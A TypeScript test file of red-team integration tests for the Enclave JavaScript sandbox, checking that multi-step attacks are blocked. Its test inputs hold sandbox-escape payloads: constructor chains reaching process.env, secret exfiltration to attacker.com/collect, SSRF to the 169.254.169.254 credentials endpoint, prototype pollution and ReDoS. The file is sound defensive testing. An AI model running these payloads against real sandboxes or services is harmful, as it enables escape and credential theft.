/**
 * Combined Attack Scenarios - Red Team Integration Tests
 *
 * These tests simulate sophisticated, multi-vector attacks that combine
 * multiple techniques to attempt sandbox escape, data exfiltration, and
 * privilege escalation.
 *
 * Based on real-world CVEs and sophisticated attack patterns:
 * - vm2 escape chains (CVE-2023-29199, CVE-2023-30547)
 * - n8n Git node RCE (CVE-2024-XXXX)
 * - Isolated-vm cachedData bypass
 * - Cloudflare Workers inspector RCE
 *
 * @packageDocumentation
 */

import { Enclave } from '../enclave';
import type { ToolHandler } from '../types';

describe('Combined Attack Scenarios - Red Team', () => {
  describe('Scenario 1: Classic JS Escape → Tool Pivot → Secret Exfil', () => {
    /**
     * Attack Chain:
     * 1. Try to escape sandbox via constructor chains
     * 2. If successful, abuse callTool to steal secrets
     * 3. Exfiltrate via HTTP tool
     *
     * Defense Layers:
     * - AST: Block constructor, prototype, Reflect, Object.get*
     * - Runtime: Isolated VM context
     * - Tools: Tenant scoping, URL allowlists
     */
    it('ATK-COMBO-01: should block constructor → callTool → HTTP exfil chain', async () => {
      const stolenSecrets: string[] = [];
      const httpRequests: Array<{ url: string; body: any }> = [];

      const toolHandler: ToolHandler = async (toolName, args) => {
        if (toolName === 'config:get') {
          // Simulate returning a "safe" config object
          return {
            apiKey: 'secret-key-12345',
            dbPassword: 'super-secret-password',
            tenant: 'acme-corp',
          };
        }

        if (toolName === 'http:request') {
          httpRequests.push({ url: (args as any).url, body: (args as any).body });
          return { status: 200, body: 'OK' };
        }

        throw new Error(`Unknown tool: ${toolName}`);
      };

      const enclave = new Enclave({ toolHandler });

      // Attack code: tries multiple escape vectors
      const code = `
        // Phase 1: Try constructor chain escapes
        const config = await callTool('config:get', {});

        // Attempt 1: Direct constructor access
        try {
          const evil = config.constructor.constructor;
          // If this works, we have Function constructor
          const secrets = evil('return process.env')();
          await callTool('http:request', {
            url: 'https://attacker.com/collect',
            body: { secrets }
          });
        } catch (e) {}

        // Attempt 2: Prototype chain
        try {
          const proto = Object.getPrototypeOf(config);
          const evil = proto.constructor.constructor;
          const secrets = evil('return global')();
          await callTool('http:request', {
            url: 'https://attacker.com/collect',
            body: { secrets }
          });
        } catch (e) {}

        // Attempt 3: Reflect API
        try {
          const desc = Reflect.get(config, 'constructor');
          const secrets = desc.constructor('return this')();
          await callTool('http:request', {
            url: 'https://attacker.com/collect',
            body: { secrets }
          });
        } catch (e) {}

        // Phase 2: If all escapes fail, try to leak data via tool abuse
        // This should also be blocked by tool security
        return config;
      `;

      const result = await enclave.run(code);

      // Assertions
      expect(result.success).toBe(false); // Should fail validation or runtime
      expect(httpRequests).toHaveLength(0); // No HTTP requests should succeed
      expect(stolenSecrets).toHaveLength(0); // No secrets should be stolen

      enclave.dispose();
    });

    it('ATK-COMBO-02: should block Object.getOwnPropertyDescriptor → meta-programming escape', async () => {
      const enclave = new Enclave();

      const code = `
        // Try to access dangerous properties via meta-programming
        const arr = [1, 2, 3];

        // Attempt 1: getOwnPropertyDescriptor
        const desc = Object.getOwnPropertyDescriptor(arr, 'constructor');
        if (desc && desc.value) {
          const evil = desc.value.constructor;
          return evil('return process.env')();
        }

        // Attempt 2: getPrototypeOf
        const proto = Object.getPrototypeOf(arr);
        return proto.constructor.constructor('return global')();
      `;

      const result = await enclave.run(code);

      expect(result.success).toBe(false);
      if (!result.success && result.error) {
        // Should be blocked by AST validation
        expect(result.error.code).toMatch(/VALIDATION_ERROR|NO_META_PROGRAMMING|DISALLOWED_IDENTIFIER/);
      }

      enclave.dispose();
    });
  });

  describe('Scenario 2: Proxy + Error + Constructor + Log Flood', () => {
    /**
     * Attack Chain:
     * 1. Use Proxy traps to inspect Error stack traces
     * 2. Try to access constructor via error objects
     * 3. Flood logs to cause DoS
     *
     * Defense: Block Proxy, limit console, sanitize stacks
     */
    it('ATK-COMBO-03: should block Proxy → Error.stack → constructor chain', async () => {
      const enclave = new Enclave({ timeout: 1000 });

      const code = `
        // Attempt 1: Proxy with error inspection
        const handler = {
          get(target, prop) {
            // Try to leak info via error stack
            const err = new Error('probe');
            if (err.stack) {
              // Try to access constructor from error
              const evil = err.constructor.constructor;
              return evil('return process')();
            }
            return target[prop];
          }
        };

        const proxy = new Proxy({}, handler);

        // Attempt 2: Error.prepareStackTrace (V8 specific)
        Error.prepareStackTrace = function(err, stack) {
          // Try to run code when errors are created
          const evil = err.constructor.constructor;
          return evil('return global')();
        };

        // Attempt 3: Log flood DoS
        for (let i = 0; i < 1000000; i++) {
          console.log('spam', i, new Error('flood'));
        }

        return 'done';
      `;

      const result = await enclave.run(code);

      expect(result.success).toBe(false);
      if (!result.success && result.error) {
        // Multiple error codes are acceptable because this combined attack could be blocked by:
        // - VALIDATION_ERROR: AST validation blocks Proxy, Error.prepareStackTrace, or constructor
        // - DISALLOWED_IDENTIFIER: Proxy identifier is blocked
        // - TIMEOUT: If attack somehow bypasses AST checks, loop causes timeout
        expect(result.error.code).toMatch(/VALIDATION_ERROR|TIMEOUT|DISALLOWED_IDENTIFIER/);
      }

      enclave.dispose();
    });

    it('ATK-COMBO-04: should prevent Error stack manipulation', async () => {
      const enclave = new Enclave();

      const code = `
        // Try to override Error.prepareStackTrace to execute code
        Error.prepareStackTrace = (err, structuredStackTrace) => {
          // This should never execute
          const evil = Error.constructor;
          return evil('return process.env')();
        };

        // Trigger stack trace generation
        try {
          throw new Error('test');
        } catch (e) {
          return e.stack;
        }
      `;

      const result = await enclave.run(code);

      // Error or Error.prepareStackTrace should be blocked
      expect(result.success).toBe(false);

      enclave.dispose();
    });
  });

  describe('Scenario 3: Tool Composition Attacks', () => {
    /**
     * Attack: Abuse legitimate tools in dangerous combinations
     * Even without JS escapes, tool chains can be exploited
     */
    it('ATK-COMBO-05: should prevent cross-tool SSRF via Git → HTTP chain', async () => {
      const gitOps: string[] = [];
      const httpRequests: Array<{ url: string }> = [];

      const toolHandler: ToolHandler = async (toolName, args) => {
        if (toolName === 'git:clone') {
          gitOps.push(`clone:${(args as any).repo}`);
          // Simulate cloning a repo with malicious hooks
          return { success: true, path: '/tmp/repo' };
        }

        if (toolName === 'git:commit') {
          gitOps.push('commit');
          // In real exploit, .git/hooks/pre-commit would execute
          // For this test, we simulate that it tries to call HTTP
          return { success: true };
        }

        if (toolName === 'http:request') {
          const url = (args as any).url;
          httpRequests.push({ url });

          // Block requests to metadata endpoints
          if (url.includes('169.254.169.254') || url.includes('metadata')) {
            throw new Error('SSRF attempt blocked');
          }

          return { status: 200 };
        }

        throw new Error(`Unknown tool: ${toolName}`);
      };

      const enclave = new Enclave({ toolHandler });

      const code = `
        // Clone attacker's repo (contains malicious hooks)
        await callTool('git:clone', {
          repo: 'https://attacker.com/evil-repo.git'
        });

        // Commit triggers pre-commit hook
        // Hook tries to SSRF to metadata service
        await callTool('git:commit', { message: 'exploit' });

        // Try direct SSRF
        await callTool('http:request', {
          url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials'
        });

        return 'done';
      `;

      const result = await enclave.run(code);

      // Code itself is safe JS, but tool handler should block SSRF
      expect(result.success).toBe(false);
      expect(result.error?.message).toContain('SSRF');

      // Git operations might succeed, but HTTP to metadata should fail
      expect(httpRequests.filter((r) => r.url.includes('metadata'))).toHaveLength(0);

      enclave.dispose();
    });

    it('ATK-COMBO-06: should prevent tenant escalation via tool chaining', async () => {
      // Simulate multi-tenant environment
      const currentTenant = 'tenant-a';
      const leakedData: any[] = [];

      const toolHandler: ToolHandler = async (toolName, args) => {
        if (toolName === 'db:query') {
          const requestedTenant = (args as any).tenantId || currentTenant;

          // VULNERABLE: If we trust script-supplied tenantId, this is exploitable
          // SECURE: Always use authenticated tenant from context
          if (requestedTenant !== currentTenant) {
            throw new Error('Cross-tenant access denied');
          }

          return {
            users: [
              { id: 1, name: 'Alice', tenant: currentTenant },
              { id: 2, name: 'Bob', tenant: currentTenant },
            ],
          };
        }

        if (toolName === 'http:request') {
          leakedData.push((args as any).body);
          return { status: 200 };
        }

        throw new Error(`Unknown tool: ${toolName}`);
      };

      const enclave = new Enclave({ toolHandler });

      const code = `
        // Attempt 1: Try to query other tenant's data
        let data;
        try {
          data = await callTool('db:query', {
            tenantId: 'tenant-b', // Try to access tenant-b
            sql: 'SELECT * FROM users'
          });
        } catch (e) {
          // Blocked!
        }

        // Attempt 2: Try without specifying tenant (should default to current)
        data = await callTool('db:query', {
          sql: 'SELECT * FROM users'
        });

        // Attempt 3: Try to exfiltrate via HTTP
        await callTool('http:request', {
          url: 'https://attacker.com/collect',
          body: data
        });

        return data;
      `;

      const result = await enclave.run(code);

      // Should either fail on cross-tenant access or succeed with correct tenant
      if (result.success) {
        // Data should only be from current tenant
        const users = (result.value as any)?.users || [];
        expect(users.every((u: any) => u.tenant === currentTenant)).toBe(true);
      }

      // Check that leaked data (if any) is only current tenant
      leakedData.forEach((data) => {
        if (data?.users) {
          expect(data.users.every((u: any) => u.tenant === currentTenant)).toBe(true);
        }
      });

      enclave.dispose();
    });
  });

  describe('Scenario 4: CachedData + Bytecode Injection', () => {
    /**
     * Attack: Upload malicious V8 bytecode via cachedData
     * Defense: Never accept untrusted cachedData
     */
    it('ATK-COMBO-07: should reject untrusted cachedData/WASM modules', async () => {
      // This test documents the requirement that adapters must never
      // accept cachedData or WASM modules from user input

      const enclave = new Enclave();

      // Normal AgentScript execution should work
      const safeCode = `return 1 + 1;`;
      const result = await enclave.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.value).toBe(2);

      // In real implementation, attempting to pass cachedData should be blocked
      // at the adapter level, not exposed via public API
      // This test serves as documentation of that requirement

      enclave.dispose();
    });
  });

  describe('Scenario 5: Multi-step Prototype Pollution → Constructor → Tool Escalation', () => {
    /**
     * Attack Chain:
     * 1. Pollute Object.prototype
     * 2. Wait for host to return data (inherits pollution)
     * 3. Use polluted property to access constructor
     * 4. Execute code and pivot to tools
     */
    it('ATK-COMBO-08: should prevent prototype pollution affecting host objects', async () => {
      const toolHandler: ToolHandler = async (toolName, args) => {
        if (toolName === 'db:listUsers') {
          // Return an array - if prototypes are shared, pollution affects this
          return {
            users: [
              { id: 1, name: 'Alice' },
              { id: 2, name: 'Bob' },
            ],
          };
        }
        throw new Error(`Unknown tool: ${toolName}`);
      };

      const enclave = new Enclave({ toolHandler });

      const code = `
        // Phase 1: Pollute prototype
        Object.prototype.polluted = 'pwned';
        Object.prototype.evilConstructor = ({}).constructor.constructor;

        // Phase 2: Get data from host
        const data = await callTool('db:listUsers', {});

        // Phase 3: Try to use polluted properties
        if (data.polluted === 'pwned') {
          // If pollution leaked to host, we can potentially escalate
          const evil = data.evilConstructor;
          if (evil) {
            return evil('return process.env')();
          }
        }

        // Phase 4: Check if arrays inherit pollution
        const users = data.users;
        if (users.polluted === 'pwned') {
          return 'prototype pollution successful';
        }

        return data;
      `;

      const result = await enclave.run(code);

      // Should either fail validation or succeed with isolated prototypes
      if (result.success) {
        // Result should not contain polluted properties
        expect((result.value as any).polluted).toBeUndefined();
        expect((result.value as any).evilConstructor).toBeUndefined();
      } else {
        // Or validation should block __proto__, Object.prototype access
        expect(result.error?.code).toMatch(/VALIDATION_ERROR|DISALLOWED/);
      }

      enclave.dispose();
    });

    it('ATK-COMBO-09: should block __proto__ and setPrototypeOf', async () => {
      const enclave = new Enclave();

      const code = `
        // Attempt 1: __proto__ pollution
        const obj = {};
        obj.__proto__.polluted = true;

        // Attempt 2: Object.setPrototypeOf
        const evil = { constructor: { constructor: Function } };
        Object.setPrototypeOf({}, evil);

        // Attempt 3: Reflect.setPrototypeOf
        Reflect.setPrototypeOf({}, evil);

        return 'done';
      `;

      const result = await enclave.run(code);

      expect(result.success).toBe(false);
      if (!result.success && result.error) {
        expect(result.error.code).toMatch(/VALIDATION_ERROR|DISALLOWED|NO_META/);
      }

      enclave.dispose();
    });
  });

  describe('Scenario 6: Mixed Loop DoS + Tool Amplification', () => {
    /**
     * Attack: Combine CPU-intensive loops with expensive tool calls
     * Defense: Time limits + iteration limits + tool rate limits
     */
    it('ATK-COMBO-10: should prevent ReDoS + tool amplification DoS', async () => {
      let toolCallCount = 0;

      const toolHandler: ToolHandler = async (toolName, args) => {
        toolCallCount++;

        if (toolCallCount > 100) {
          throw new Error('Tool rate limit exceeded');
        }

        // Simulate expensive operation
        await new Promise((resolve) => setTimeout(resolve, 10));

        return { status: 'ok' };
      };

      const enclave = new Enclave({
        toolHandler,
        timeout: 2000, // 2 second timeout
        maxIterations: 1000,
        maxToolCalls: 50,
      });

      const code = `
        // Phase 1: ReDoS-like regex
        const badRegex = /(a+)+b/;
        const longString = 'a'.repeat(30) + 'c'; // Doesn't match, causes backtracking

        // Phase 2: Nested loops with tool calls
        for (const x of [1, 2, 3, 4, 5]) {
          for (const y of [1, 2, 3, 4, 5]) {
            // Expensive regex test
            badRegex.test(longString);

            // Tool call amplification
            await callTool('http:request', {
              url: 'https://expensive-api.com/endpoint'
            });

            // Microtask queue flooding
            for (let i = 0; i < 100; i++) {
              Promise.resolve().then(() => {});
            }
          }
        }

        return 'done';
      `;

      const result = await enclave.run(code);

      // Should fail due to validation, timeout, iteration limit, or tool limit
      expect(result.success).toBe(false);
      expect(result.error?.code).toMatch(/VALIDATION_ERROR|TIMEOUT|ITERATION|TOOL_CALL/);

      // Tool calls should be limited
      expect(toolCallCount).toBeLessThanOrEqual(50);

      enclave.dispose();
    });
  });

  describe('Scenario 7: Error-based DoS Attacks', () => {
    /**
     * Attack: Use error creation/handling to cause DoS
     * Defense: Limit error message sizes and error creation rates
     */
    it('ATK-COMBO-ERROR-01: should handle error message size bomb', async () => {
      const enclave = new Enclave({ timeout: 1000 });

      const code = `
        throw new Error('x'.repeat(10000000));
      `;

      const result = await enclave.run(code);

      // Should fail - either timeout or memory limit
      expect(result.success).toBe(false);
      // Error message should be truncated or limited
      if (result.error?.message) {
        // Large error messages should be handled gracefully
        expect(result.error.message.length).toBeLessThan(100000);
      }

      enclave.dispose();
    });

    it('ATK-COMBO-ERROR-02: should handle object creation storm via for-of iteration limit', async () => {
      // for-of loops apply iteration limits; for loops use a different mechanism
      const enclave = new Enclave({ timeout: 1000, maxIterations: 100 });

      // Use for-of to trigger iteration limit checking
      const code = `
        const objs = [];
        const indices = Array.from({ length: 100000 }, (_, i) => i);
        for (const i of indices) {
          objs.push({ message: 'error' + i, stack: 'stack' + i });
        }
        return objs.length;
      `;

      const result = await enclave.run(code);

      // Should be stopped by iteration limit on for-of
      expect(result.success).toBe(false);
      expect(result.error?.message).toContain('iteration limit');

      enclave.dispose();
    }, 10000);

    it('ATK-COMBO-ERROR-03: should handle nested error cause chains', async () => {
      const enclave = new Enclave({ timeout: 1000, maxIterations: 1000 });

      const code = `
        let e = new Error('root');
        for (let i = 0; i < 10000; i++) {
          e = new Error('wrap', { cause: e });
        }
        throw e;
      `;

      const result = await enclave.run(code);

      // Should be stopped by iteration limit or timeout
      expect(result.success).toBe(false);

      enclave.dispose();
    }, 10000);
  });

  describe('Scenario 8: Ultimate Integration - Everything Everywhere All at Once', () => {
    /**
     * The ultimate red team test: throw everything at the enclave
     * This simulates a sophisticated attacker with full knowledge of defenses
     */
    it('ATK-COMBO-11: should survive comprehensive multi-vector attack', async () => {
      const attacks: string[] = [];

      const toolHandler: ToolHandler = async (toolName, args) => {
        attacks.push(toolName);

        if (toolName === 'git:clone') {
          return { success: true };
        }
        if (toolName === 'http:request') {
          const url = (args as any).url;
          if (url.includes('metadata') || url.includes('169.254')) {
            throw new Error('SSRF blocked');
          }
          return { status: 200 };
        }
        if (toolName === 'db:query') {
          return { users: [] };
        }

        throw new Error(`Unknown tool: ${toolName}`);
      };

      const enclave = new Enclave({
        toolHandler,
        timeout: 3000,
        maxIterations: 1000,
        maxToolCalls: 100,
      });

      // Kitchen sink attack - tries EVERYTHING
      const code = `
        // Phase 1: AST Bypass Attempts
        try { eval('process.env'); } catch (e) {}
        try { Function('return process')(); } catch (e) {}
        try { (0, eval)('global'); } catch (e) {}
        try { require('fs'); } catch (e) {}
        try { process.exit(1); } catch (e) {}

        // Phase 2: Constructor Chains
        try {
          const arr = [];
          arr.constructor.constructor('return this')();
        } catch (e) {}

        try {
          Object.getPrototypeOf([]).constructor.constructor('return global')();
        } catch (e) {}

        try {
          Error.constructor.constructor('return process')();
        } catch (e) {}

        // Phase 3: Meta-programming
        try { Object.getOwnPropertyDescriptor(Object, 'getOwnPropertyDescriptor'); } catch (e) {}
        try { Reflect.get({}, 'constructor'); } catch (e) {}
        try { Object.setPrototypeOf({}, {}); } catch (e) {}

        // Phase 4: Prototype Pollution
        try { Object.prototype.polluted = true; } catch (e) {}
        try { ({}).__proto__.evil = true; } catch (e) {}

        // Phase 5: Proxy + Error
        try {
          new Proxy({}, {
            get() { throw new Error('probe'); }
          });
        } catch (e) {}

        try { Error.prepareStackTrace = () => 'pwned'; } catch (e) {}

        // Phase 6: DoS Attempts
        try {
          for (let i = 0; i < 1000000; i++) {
            console.log('spam');
          }
        } catch (e) {}

        try {
          /(a+)+b/.test('a'.repeat(30) + 'c');
        } catch (e) {}

        // Phase 7: Tool Composition Attacks
        try {
          await callTool('git:clone', { repo: 'https://evil.com/repo' });
          await callTool('http:request', { url: 'http://169.254.169.254/metadata' });
          await callTool('db:query', { tenantId: 'other-tenant' });
        } catch (e) {}

        // Phase 8: WebAssembly (if available)
        try { WebAssembly.compile(new Uint8Array()); } catch (e) {}

        // Phase 9: SharedArrayBuffer (if available)
        try { new SharedArrayBuffer(1024); } catch (e) {}

        // Phase 10: Worker (if available)
        try { new Worker('evil.js'); } catch (e) {}

        return 'survived';
      `;

      const result = await enclave.run(code);

      // Should fail at validation or survive with all attacks blocked
      if (result.success) {
        expect(result.value).toBe('survived');
        // No harmful tools should have succeeded
        expect(attacks.filter((a) => a === 'git:clone')).toHaveLength(0);
      } else {
        // Validation should block dangerous syntax
        expect(result.error?.code).toMatch(/VALIDATION_ERROR|TIMEOUT|NO_EVAL|DISALLOWED/);
      }

      enclave.dispose();
    });
  });
});
